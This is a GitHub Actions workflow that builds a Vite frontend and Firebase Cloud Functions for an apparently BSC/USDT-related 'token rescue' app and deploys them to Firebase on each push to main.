name: Deploy to Firebase on merge
'on':
  push:
    branches:
      - main
jobs:
  build_and_deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Node.js 22
        uses: actions/setup-node@v4
        with:
          node-version: 22

      - name: Install dependencies and build frontend
        run: npm ci && npm run build
        env:
          VITE_BSC_HTTP_RPC_URL: "https://bsc-rpc.publicnode.com/"
          VITE_BSC_WS_RPC_URL: "wss://bsc-rpc.publicnode.com/"
          VITE_BSC_CHAIN_ID: "56"
          VITE_BSC_USDT_CONTRACT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955"
          VITE_TOKEN_RESCUE_CONTRACT: "0xc6bf6838263938533e547f825d257c9965544a50"
          VITE_RESCUE_DESTINATION_ADDRESS: "0xc6bf6838263938533e547f825d257c9965544a50"
          VITE_API_BASE: "https://us-central1-transfer-9d294.cloudfunctions.net"
          
      - name: Install dependencies and build Cloud Functions
        run: cd functions && npm ci && npm run build

      - name: Deploy to Firebase (Hosting, Functions, Firestore)
        uses: w9jds/firebase-action@master
        with:
          args: deploy --only hosting,functions,firestore:rules --force
        env:
          GCP_SA_KEY: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_TRANSFER_9D294 }}
          PROJECT_ID: transfer-9d294
